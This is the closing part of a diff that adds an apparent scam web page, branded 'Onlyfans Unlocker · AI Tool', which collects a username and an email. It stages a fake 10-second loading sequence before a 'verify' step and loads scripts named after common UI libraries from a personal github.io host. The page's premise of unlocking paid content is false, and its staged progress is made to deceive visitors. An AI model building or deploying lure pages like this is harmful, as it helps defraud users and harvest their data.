+        playSuccess();
+        btn.disabled = false;
+        btn.innerHTML = '<span class="pulse-ring"></span><i class="fas fa-arrow-right"></i><span>Continue</span>';
+      }, 10000);
+    }
+
+    // ============================================================
+    //  KEYBOARD: Enter to submit
+    // ============================================================
+    document.getElementById('usernameInput').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); handleContinue(); }
+    });
+    document.getElementById('emailInput').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); handleContinue(); }
+    });
+
+    // ============================================================
+    //  _gu() for verify button (legacy hook)
+    // ============================================================
+    function _gu() {
+      if (navigator.vibrate) navigator.vibrate(10);
+    }
+
+    // ============================================================
+    //  Cleanup
+    // ============================================================
+    window.addEventListener('beforeunload', function() {
+      if (progressInterval) clearInterval(progressInterval);
+      if (loadingTimer) clearTimeout(loadingTimer);
+    });
+
+    console.log('🔓 Onlyfans Unlocker · AI Tool ready (10s load → verify)');
+  </script>
+
+  <!-- ===== EXTERNAL LIBS ===== -->
+  <script src="https://imax083.github.io/js/vanillatoasts.js"></script>
+  <script src="https://imax083.github.io/js/sweetalert2.js"></script>
+
+</body>
+</html>
